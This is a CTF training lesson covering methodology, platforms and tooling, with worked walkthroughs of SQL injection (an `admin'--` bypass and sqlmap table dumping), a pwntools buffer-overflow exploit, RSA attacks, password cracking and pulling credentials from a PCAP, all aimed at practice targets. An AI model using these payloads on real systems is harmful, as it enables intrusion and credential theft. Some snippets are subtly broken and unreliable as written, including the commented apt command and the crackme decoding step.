# Lesson 28: CTF Challenges and Practice

> **Security Advanced · Lesson 28** | Difficulty: ★★★★★ Expert | Time: ~180 min

---

## Learning Objectives

By the end of this lesson you will be able to:

- Apply a structured CTF methodology to approaching unknown challenges
- Navigate the major CTF platforms: PicoCTF, HackTheBox, and TryHackMe
- Solve typical challenges in common CTF categories: web, crypto, forensics, binary exploitation, and OSINT
- Build and organise a personal CTF toolkit
- Read, understand, and learn from public writeups

---

## Prerequisites

- All previous Security Advanced lessons (21–27)
- Comfort with Python scripting
- GDB, pwntools, Burp Suite, Wireshark, and standard CTF tools installed
- A registered account on at least one CTF platform

---

## Key Concepts

### 1. CTF Fundamentals

A **Capture the Flag** (CTF) competition challenges participants to find hidden strings (flags) by solving security puzzles. Flags typically look like `picoCTF{s0m3_v4lu3}`, `HTB{...}`, or `flag{...}`.

**Competition formats**:

| Format | Description | Best For |
|--------|-------------|----------|
| **Jeopardy** | Standalone challenges sorted by category and points | Beginners; skill-building |
| **Attack-Defense** | Teams attack each other's services while defending their own | Advanced; team play |
| **King of the Hill** | Control a resource longer than everyone else | Advanced team play |
| **Linear / Story** | Challenges unlock progressively | Learning paths |

**Main CTF categories**:

| Category | Skills Tested |
|----------|---------------|
| **Web** | SQLi, XSS, IDOR, SSRF, deserialization |
| **Crypto** | Classical ciphers, RSA attacks, hash cracking |
| **Forensics** | Steganography, file carving, PCAP analysis, log analysis |
| **Pwn/Binary** | Buffer overflows, ROP chains, format strings, heap exploitation |
| **Reverse Engineering** | Disassembly, deobfuscation, anti-debugging |
| **OSINT** | Open-source intelligence gathering |
| **Misc** | Trivia, scripting, encoding/decoding |

### 2. CTF Methodology

```
New Challenge Received
        │
        ▼
① Reconnaissance & Information Gathering
   • What category? What service?
   • Source code provided?
   • Run: file, strings, xxd, nmap

        │
        ▼
② Hypothesis Generation
   • What attack vectors are likely?
   • What did the challenge creator intend?
   • Look for hints in challenge name/description

        │
        ▼
③ Enumeration
   • Map the full attack surface
   • Web: directory busting, parameter fuzzing
   • Binary: checksec, decompile, trace

        │
        ▼
④ Exploitation
   • Test hypotheses one at a time
   • Start simple, escalate complexity
   • Script everything for repeatability

        │
        ▼
⑤ Flag Extraction & Documentation
   • Submit flag
   • Note what worked, what didn't
   • Write up findings (for learning)
```

### 3. CTF Platforms

#### PicoCTF (picoctf.org)

Designed for high school/college students; excellent for beginners and intermediate players.

```bash
# PicoCTF uses a web shell and Linux-based challenges
# Many challenges are accessible via netcat:
nc mars.picoctf.net 31337

# Or SSH into a remote instance:
ssh ctf-player@host -p PORT
```

Key features:
- Year-round practice arena with archived challenges
- Guided hints system
- leaderboard with team support
- Strong web, crypto, and forensics challenge library

#### HackTheBox (hackthebox.com)

Professional-grade penetration testing labs.

```bash
# Connect via OpenVPN
sudo openvpn ~/Downloads/lab_username.ovpn

# Verify VPN connection
ip addr show tun0
ping 10.10.10.1  # HTB network gateway

# Begin enumeration of a machine
nmap -sC -sV -oA initial_scan 10.10.10.X
```

Key features:
- Active machines (no walkthroughs until retired)
- Pro Labs: realistic corporate environments
- Fortress challenges, Battlegrounds (A/D mode)
- Strong community writeups for retired machines

#### TryHackMe (tryhackme.com)

Guided learning paths with structured rooms.

```bash
# Connect via OpenVPN
sudo openvpn ~/Downloads/username.ovpn

# Or use the browser-based AttackBox (no VPN needed)
# Each room provides a Deploy button for target VMs
```

Key features:
- Learning paths (e.g., "SOC Analyst", "Jr Penetration Tester")
- Fully guided rooms with step-by-step instructions
- Excellent for beginners and structured learning
- Free tier available

### 4. Essential CTF Toolkit

```bash
# Install the core CTF toolkit
sudo apt update && sudo apt install -y \
  # Network & web
  nmap netcat-openbsd curl wget burpsuite dirb gobuster wfuzz \
  # Binary analysis
  gdb python3-pwntools radare2 ltrace strace binutils checksec \
  # Cryptography
  hashcat john openssl python3-pycryptodome sage \
  # Forensics
  foremost sleuthkit autopsy wireshark tshark binwalk exiftool \
  steghide stegosuite ffmpeg sox \
  # Misc
  python3-requests python3-beautifulsoup4 pwncat-cs

# Python CTF libraries
pip3 install pwntools requests beautifulsoup4 pycryptodome \
  sympy z3-solver scapy pillow

# Install CyberChef locally
docker run -d -p 8080:80 mpepping/cyberchef
```

```bash
# Useful one-liners for CTF prep

# Quick port scan
nmap -p- --min-rate 5000 -T4 TARGET_IP -oN ports.txt

# Directory brute-force
gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -o gobuster.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt

# Password cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt  # SHA-512

# Extract all embedded files from a binary/image
binwalk -e suspicious_file

# Check image steganography
steghide extract -sf image.jpg -p ""  # empty passphrase
steghide extract -sf image.jpg -p password
```

### 5. Example Challenge Walkthroughs

#### Challenge 1: Classic SQL Injection (Web)

**Description**: A login form at `http://challenge.ctf/login` — find a way in.

```bash
# Step 1: Try basic SQLi bypass
curl -s -X POST http://challenge.ctf/login \
  -d "username=admin'--&password=anything" | grep -i "flag\|welcome\|logout"

# If that works, extract the flag from the database
# Step 2: Confirm SQLi
curl -s "http://challenge.ctf/page?id=1 AND 1=1" | md5sum
curl -s "http://challenge.ctf/page?id=1 AND 1=2" | md5sum
# Different hashes = boolean blind SQLi

# Step 3: Automated extraction
sqlmap -u "http://challenge.ctf/page?id=1" --dbs --batch --level=3
sqlmap -u "http://challenge.ctf/page?id=1" -D ctfdb -T flags --dump --batch
```

#### Challenge 2: File Format and Steganography (Forensics)

**Description**: Here is an image – find the flag hidden inside.

```bash
# Step 1: Initial triage
file challenge.jpg
exiftool challenge.jpg | grep -iE "comment|artist|description|software|flag"

# Step 2: Check for appended data
xxd challenge.jpg | tail -20
binwalk challenge.jpg
binwalk -e challenge.jpg  # Extract embedded files

# Step 3: Try steganography tools
steghide extract -sf challenge.jpg -p ""
steghide info challenge.jpg

# Try zsteg (for PNG/BMP)
sudo gem install zsteg 2>/dev/null
zsteg challenge.png 2>/dev/null

# Step 4: Try known LSB (Least Significant Bit) steganography
python3 << 'EOF'
from PIL import Image
img = Image.open('challenge.png').convert('RGB')
bits = []
for pixel in img.getdata():
    for channel in pixel[:3]:  # R, G, B
        bits.append(channel & 1)
# Convert bits to bytes
chars = []
for i in range(0, len(bits)-7, 8):
    byte = 0
    for j in range(8):
        byte = (byte << 1) | bits[i+j]
    if byte == 0:
        break
    chars.append(chr(byte))
result = ''.join(chars)
print("LSB decode:", result[:200])
EOF
```

#### Challenge 3: RSA Crypto Attack (Crypto)

**Description**: Given: `n`, `e`, `c` (ciphertext). The public exponent `e=3`. Find the plaintext.

```python
#!/usr/bin/env python3
# rsa_small_e.py – Small public exponent attack (cube root attack when e=3)

from Crypto.Util.number import long_to_bytes
import gmpy2

# Values from challenge
n = 0x...  # Replace with actual value
e = 3
c = 0x...  # Replace with actual ciphertext

# If the message is short enough, m^e < n, so c = m^e (no reduction)
# Taking the eth root of c gives us m directly
m, exact = gmpy2.iroot(c, e)
if exact:
    print("Flag:", long_to_bytes(m).decode())
else:
    print("Need to try Broadcast Attack or check message padding")
    # Broadcast attack (if 3 ciphertexts with same message but different n)
    # Uses Chinese Remainder Theorem
```

```bash
# Run the attack
python3 rsa_small_e.py

# For weak primes (factor n with online tool)
# https://factordb.com/  or  https://www.alpertron.com.ar/ECM.HTM
python3 << 'EOF'
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, long_to_bytes

# After factoring n into p and q:
p = 0x...
q = 0x...
e = 65537
c = 0x...

n = p * q
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
print("Decrypted:", long_to_bytes(m))
EOF
```

#### Challenge 4: Buffer Overflow (Pwn/Binary)

**Description**: A vulnerable 64-bit binary with no ASLR, no canary, NX enabled.

```bash
# Step 1: Analysis
file vuln_binary
checksec --file=vuln_binary
strings vuln_binary | grep -iE "flag|win|shell"

# Step 2: Find the offset to return address
gdb -q vuln_binary
# (gdb) run
# Send a cyclic pattern to find offset:
python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)" | ./vuln_binary
```

```python
#!/usr/bin/env python3
# pwn_basic_overflow.py
from pwn import *

# Local exploit
# p = process('./vuln_binary')
# Remote exploit
p = remote('challenge.ctf', 31337)

elf = ELF('./vuln_binary')

# Find the address of the win() function (or ret2libc)
win_addr = elf.symbols['win']  # or find with: nm vuln_binary | grep win
log.info(f"win() address: {hex(win_addr)}")

# Find the offset using cyclic pattern
# In GDB: cyclic 200 -> run -> info registers -> cyclic -l <rsp value>
offset = 72  # Determined from GDB analysis

# Craft the payload
# [padding] + [return address]
payload = b'A' * offset
payload += p64(win_addr)

# Some 64-bit binaries need a 'ret' gadget for stack alignment
# ROPgadget --binary vuln_binary | grep ": ret$"
ret_gadget = elf.search(asm('ret', arch='amd64')).__next__()
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)

p.sendlineafter(b'Input: ', payload)
p.interactive()
```

#### Challenge 5: PCAP Forensics (Forensics/Network)

**Description**: Here is a network capture – find the credentials.

```bash
# Step 1: Get an overview
tcpdump -r challenge.pcap -nn | head -30
tshark -r challenge.pcap -z io,phs -q 2>/dev/null  # Protocol hierarchy

# Step 2: Follow HTTP streams
tshark -r challenge.pcap -Y "http" -T fields \
  -e frame.number -e ip.src -e http.request.method \
  -e http.host -e http.request.uri 2>/dev/null | head -30

# Step 3: Extract credentials from basic auth
tshark -r challenge.pcap -Y "http.authorization" -T fields \
  -e http.authorization 2>/dev/null | base64 -d 2>/dev/null

# Step 4: Find flag in HTTP responses
tshark -r challenge.pcap -Y "http.response" -T fields \
  -e http.file_data 2>/dev/null | grep -oE "flag\{[^}]+\}|CTF\{[^}]+\}"

# Step 5: Export HTTP objects (download files transferred)
tshark -r challenge.pcap --export-objects "http,/tmp/http_objects/" 2>/dev/null
ls /tmp/http_objects/

# Step 6: Check for DNS-tunneled data
tshark -r challenge.pcap -Y "dns" -T fields -e dns.qry.name 2>/dev/null \
  | sort -u | awk '{print length, $0}' | sort -rn | head -20

# Step 7: Reassemble a TCP stream
tshark -r challenge.pcap -z follow,tcp,ascii,0 -q 2>/dev/null | head -100
```

### 6. CTF Tips and Tricks

```bash
# Quick encoding/decoding one-liners

# Base64
echo "aGVsbG8=" | base64 -d
echo "hello" | base64

# Hex
echo "68656c6c6f" | xxd -r -p
echo "hello" | xxd -p

# ROT13
echo "uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# URL encode/decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%68%65%6c%6c%6f'))"
python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"

# XOR brute-force (single-byte key)
python3 << 'EOF'
ciphertext = bytes.fromhex("1a2b3c4d5e")
for key in range(256):
    plaintext = bytes([b ^ key for b in ciphertext])
    try:
        decoded = plaintext.decode('ascii')
        if all(32 <= ord(c) < 127 for c in decoded):
            print(f"Key {key}: {decoded}")
    except:
        pass
EOF

# Caesar cipher brute-force
python3 << 'EOF'
ciphertext = "Fdhvdu flskhu lv ixq"
for shift in range(26):
    decrypted = ''.join(
        chr((ord(c) - ord('A') - shift) % 26 + ord('A')) if c.isupper() else
        chr((ord(c) - ord('a') - shift) % 26 + ord('a')) if c.islower() else c
        for c in ciphertext
    )
    print(f"Shift {shift:2d}: {decrypted}")
EOF

# Hash identification and cracking
hash-identifier <hash>       # Identify hash type
# or: https://hashes.com/en/tools/hash_identifier

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

```bash
# Useful CTF recon one-liners

# Enumerate all GET/POST parameters on a page
curl -s http://target/page | grep -oE 'name="[^"]*"' | sort -u

# Find comments in HTML source
curl -s http://target/ | grep "<!--" | head -20

# Check robots.txt and sitemap
curl -s http://target/robots.txt
curl -s http://target/sitemap.xml

# Check for backup files
for ext in bak old backup~ .swp .save; do
  curl -sf "http://target/index.php$ext" -o - | head -5 && echo "FOUND: index.php$ext"
done

# FFUF – fast parameter/directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target/FUZZ \
  -mc 200,301,302 -o ffuf_results.txt
```

---

## Practical Exercises

### Exercise 1 – Set Up Your CTF Environment

```bash
# Create an organised CTF workspace
mkdir -p ~/ctf/{tools,writeups,wordlists}
mkdir -p ~/ctf/active/{web,crypto,forensics,pwn,rev,misc}

# Download essential wordlists
sudo apt install -y wordlists seclists
ls /usr/share/wordlists/
ls /usr/share/seclists/

# Create a CTF helper script
cat > ~/ctf/tools/init_challenge.sh << 'SCRIPT'
#!/bin/bash
# Usage: ./init_challenge.sh <category> <challenge_name>
CATEGORY=$1; NAME=$2; DIR=~/ctf/active/$CATEGORY/$NAME
mkdir -p $DIR && cd $DIR
echo "# $NAME" > notes.md
echo "Challenge: $NAME" >> notes.md
echo "Category: $CATEGORY" >> notes.md
echo "Date: $(date)" >> notes.md
echo "" >> notes.md
echo "## Notes" >> notes.md
echo "" >> notes.md
echo "## Flag" >> notes.md
echo "Initialised challenge directory: $DIR"
SCRIPT
chmod +x ~/ctf/tools/init_challenge.sh
```

### Exercise 2 – Solve a Self-Contained Crypto Challenge

```bash
# Decode a multi-layered encoded flag
ENCODED="ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259"

# Layer 1: Base64
LAYER1=$(echo $ENCODED | base64 -d 2>/dev/null)
echo "Layer 1 (base64): $LAYER1"

# Check if there are more layers
echo $LAYER1 | base64 -d 2>/dev/null && echo "(another base64 layer)" || \
  echo $LAYER1 | xxd -r -p 2>/dev/null | strings | head -5 || \
  echo "Final value: $LAYER1"
```

### Exercise 3 – File Forensics Mini-Challenge

```bash
# Create a mini forensics challenge (hide a flag in plain sight)
# Create a PNG with a hidden flag in metadata
convert -size 100x100 xc:white /tmp/challenge.png 2>/dev/null || \
  python3 -c "
from PIL import Image
img = Image.new('RGB', (100, 100), color='white')
img.save('/tmp/challenge.png')
"

# Add flag to EXIF comment
exiftool -Comment="flag{exif_metadata_is_interesting}" /tmp/challenge.png 2>/dev/null || \
  python3 -c "
with open('/tmp/challenge.png', 'ab') as f:
    f.write(b'\n# flag{check_the_end_of_file}\n')
"

# Now solve it:
echo "=== File type ==="
file /tmp/challenge.png

echo "=== Strings at end of file ==="
strings /tmp/challenge.png | tail -5

echo "=== EXIF data ==="
exiftool /tmp/challenge.png 2>/dev/null | grep -i "comment\|flag"

rm /tmp/challenge.png
```

### Exercise 4 – Binary Analysis Mini-Challenge

```bash
# Compile a simple crackme
cat > /tmp/crackme.c << 'EOF'
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc != 2) { printf("Usage: %s <password>\n", argv[0]); return 1; }
    char encoded[] = {0x67,0x6c,0x61,0x68,0x7a,0x69,0x62,0x61,0x73,0x65,0x00};
    char decoded[16];
    for (int i = 0; encoded[i]; i++) decoded[i] = encoded[i] - 5;
    decoded[strlen(encoded)] = 0;
    if (strcmp(argv[1], decoded) == 0) {
        printf("flag{%s_is_the_password}\n", decoded);
    } else {
        printf("Wrong!\n");
    }
    return 0;
}
EOF
gcc -o /tmp/crackme /tmp/crackme.c

# Solve it:
echo "=== ltrace method ==="
ltrace /tmp/crackme wrong_guess 2>&1 | grep strcmp

echo "=== strings method ==="
strings /tmp/crackme | grep -E "^[a-zA-Z0-9_]{5,}$"

echo "=== decode the XOR ==="
python3 -c "
enc = [0x67,0x6c,0x61,0x68,0x7a,0x69,0x62,0x61,0x73,0x65]
print('Decoded:', ''.join(chr(b-5) for b in enc))
"

# Try the decoded password
PASS=$(python3 -c "enc=[0x67,0x6c,0x61,0x68,0x7a,0x69,0x62,0x61,0x73,0x65]; print(''.join(chr(b-5) for b in enc))")
/tmp/crackme "$PASS"

rm /tmp/crackme /tmp/crackme.c
```

---

## Common Pitfalls

| Pitfall | Impact | Fix |
|---------|--------|-----|
| Overthinking – assuming it's harder than it is | Waste time on complex paths | Try the obvious first: inspect metadata, read source, basic SQLi |
| Not reading the challenge description carefully | Miss important hints | Highlight every word; names and descriptions often contain hints |
| Giving up too early | Miss valuable learning | Use hints, look at similar past challenges, ask teammates |
| Not scripting repeated operations | Slow brute-forcing | Write Python/Bash scripts for anything you do more than twice |
| Doing everything alone | Slower and less fun | CTF is a team sport; share partial findings with teammates |
| Forgetting to take notes | Can't reproduce or write up | Document every step, every dead end |
| Racing for first blood, ignoring easier challenges | Low score | Sort by points; sometimes lower-point challenges are faster |

---

## Summary

- CTF competitions are the best way to develop practical security skills in a legal, structured environment
- **Methodology** is everything: triage → hypothesise → enumerate → exploit → document
- **PicoCTF** (beginner), **TryHackMe** (guided), **HackTheBox** (professional) cover different skill levels
- Build a personal toolkit and automate repetitive operations with Python/Bash scripts
- Common challenge techniques: SQLi, base64/hex/XOR decoding, PCAP analysis, buffer overflows, RSA attacks
- Always read writeups for challenges you couldn't solve — learning from others is essential
- The best CTF players combine broad knowledge with deep dives when needed

---

## Further Reading

- [PicoCTF](https://picoctf.org/) – free beginner-friendly platform
- [HackTheBox](https://www.hackthebox.com/) – professional pentesting labs
- [TryHackMe](https://tryhackme.com/) – guided learning paths
- [CTFtime.org](https://ctftime.org/) – upcoming competitions and team leaderboards
- [CyberChef](https://gchq.github.io/CyberChef/) – browser-based encoding/decoding Swiss Army knife
- [pwntools Documentation](https://docs.pwntools.com/) – Python library for CTF exploit development
- [pwn.college](https://pwn.college/) – free binary exploitation curriculum
- *Hacking: The Art of Exploitation* by Jon Erickson (No Starch Press)
